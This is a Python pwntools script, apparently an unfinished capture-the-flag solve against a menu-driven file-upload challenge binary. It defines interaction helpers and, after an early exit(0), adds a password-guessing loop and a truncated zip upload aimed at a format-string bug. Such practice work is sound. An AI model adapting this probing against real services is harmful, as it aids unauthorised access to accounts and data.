#!/usr/bin/env python3
import io
import zipfile

from pwn import *


exe = ELF("chal_patched")

context.binary = exe
context.terminal = ['alacritty', '-e', 'bash', '-c']
#context.log_level = 'debug'

LOCAL = True
DEBUG = True

HOST = ""
PORT = 1337

gdbscript = '''
b *checkInvite+144
b *askUserAndPass+224
c
'''


if LOCAL:
    if DEBUG:
        r = gdb.debug([exe.path], gdbscript=gdbscript)
    else:
        r = process([exe.path])
else:
    r = remote(HOST, PORT)



# make a zip with format string filename


def list_users():
    r.sendlineafter(b'> ', b'1')

def list_files(uid: int):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'id?', str(uid).encode())


def create_user(invite_code: bytes, username: bytes, password: bytes):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'code? ', str(invite_code).encode())

    r.sendlineafter(b'Username? ', str(username).encode())
    r.sendlineafter(b'Password? ', str(password).encode())


def upload_file(uid: int, contents: bytes):
    r.sendlineafter(b'> ', b'4')
    r.sendlineafter(b'to? ', str(uid).encode())
    r.sendlineafter(b'uncompressed file', contents.hex().encode())


def view_file(uid: int, password: bytes, file_id: int):
    r.sendlineafter(b'> ', b'5')
    r.sendlineafter(b'User id? ', str(uid).encode())
    r.sendlineafter(b'Password? ', password)
    r.sendlineafter(b'contents of? ', str(file_id).encode())


def view_flag(uid: int, password: bytes):
    r.sendlineafter(b'> ', b'6')
    r.sendlineafter(b'User id? ', str(uid).encode())
    r.sendlineafter(b'Password? ', password)


exit(0)
for guess in range(0x30, 0x40):
    view_file(15, chr(guess).encode() + b'\x00', 1)

for _ in range(1):
    zip_stream = io.BytesIO()
    with zipfile.ZipFile(zip_stream, mode='w') as archive:
        archive.writestr('a', b'A'*16)

    zip_stream.seek(0)
    upload_file(15, zip_stream.read()[:510])

list_files(15)

r.interactive()
